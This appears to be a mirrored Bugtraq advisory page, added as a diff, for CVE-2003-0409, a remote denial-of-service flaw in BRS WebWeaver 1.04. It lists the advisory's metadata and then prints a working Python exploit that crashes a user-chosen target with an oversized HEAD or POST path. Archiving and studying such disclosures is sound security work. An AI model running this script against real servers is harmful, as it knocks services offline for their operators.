@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid7695<p><b><span style="font-size: 18pt;">BRS WebWeaver POST and HEAD Denial Of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/7695/info">info</a><br><a href="http://www.securityfocus.com/bid/7695/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/7695/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/7695/solution">solution</a><br><a href="http://www.securityfocus.com/bid/7695/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				7695
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2003-0409<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 26 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 10:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to euronymous &lt;just-a-user@yandex.ru&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					BRS WebWeaver 1.0 4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following exploit was provided:<br/><br/>}------- start of fadvWWhtdos.py ---------------{<br/><br/>#! /usr/bin/env python<br/>###<br/># WebWeaver 1.04 Http Server DoS exploit<br/># by euronymous /f0kp http://f0kp.iplus.ru<br/>########<br/># Usage: ./fadvWWhtdos.py<br/>########<br/><br/>import sys<br/>import httplib<br/><br/>met = raw_input("""<br/>What kind request you want make to crash webweaver??  HEAD/POST :<br/>""")<br/>target = raw_input("Type your target hostname  w/o http:// : ")<br/>spl = "f0kp"*0x1FEF<br/>conn = httplib.HTTPConnection(target)<br/>conn.request(met, "/"+spl)<br/>r1 = conn.getresponse()<br/>print r1.status<br/><br/>}--------- end of fadvWWhtdos.py ---------------{
+	
+		<ul>
+</ul>
+</div>
